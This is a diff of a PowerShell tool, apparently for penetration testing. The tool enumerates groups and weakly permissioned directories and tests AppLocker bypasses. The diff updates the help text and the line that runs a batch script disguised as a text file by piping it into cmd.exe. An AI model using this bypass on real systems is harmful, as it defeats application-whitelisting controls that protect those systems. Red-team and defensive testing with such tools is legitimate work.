@@ -1,6 +1,9 @@
 ﻿<#
 .SYNOPSIS
-   Enumerate Directorys with weak permissions (bypass applocker)
+   1 - Enumerate ALL Group Names Available
+   2 - Enumerate Directorys with weak permissions
+   3 - Test AppLocker Batch Execution Restrictions bypass
+   4 - Execute Batch scripts through text format bypass technic
 
    Author: @r00t-3xp10it
    Tested Under: Windows 10 (18363) x64 bits
@@ -120,10 +123,14 @@ If($WhoAmi -ieq "Groups"){
    <#
    .SYNOPSIS
       Author: r00t-3xp10it
-      Helper - List ALL Group Names Available
+      Helper - Enumerate ALL Group Names Available
+
+   .Parameter WhoAmi
+      Accepts argument: Groups
 
    .EXAMPLE
       PS C:\> .\AppLocker.ps1 -WhoAmi Groups
+      Enumerate ALL Group Names Available
 
    .OUTPUTS
       Group Name                                                 Type             SID          Attributes
@@ -298,7 +305,6 @@ If($TestBat -Match '\\'){
 
       C:\Users\pedro\Coding>@echo off
       systeminfo|findstr "Host OS Type"|findstr /V "BIOS"
-
       Host Name:                 SKYNET
       OS Name:                   Microsoft Windows 10 Home
       OS Version:                10.0.18363 N/A Build 18363
@@ -318,7 +324,7 @@ If($TestBat -Match '\\'){
 
    ## Make sure the user input file exists
    If(-not(Test-Path -Path "$TestBat" -EA SilentlyContinue)){
-      Write-Host "`n`n[error] not found: $TestBat" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "`n`n[error] not found: $TestBat`n`n" -ForegroundColor Red -BackgroundColor Black
       exit ## Exit @AppLocker
    }
 
@@ -333,7 +339,7 @@ If($TestBat -Match '\\'){
    cd $StripPath
    Write-Host "[i] trying to execute $Bypassext text file"
    Start-Sleep -Seconds 1;Write-Host "script output:`n`n"
-   Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe < $Bypassext"
+   Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe /K < $Bypassext"
 
    cd $Working_Directory
    ## Delete ALL artifacts left behind
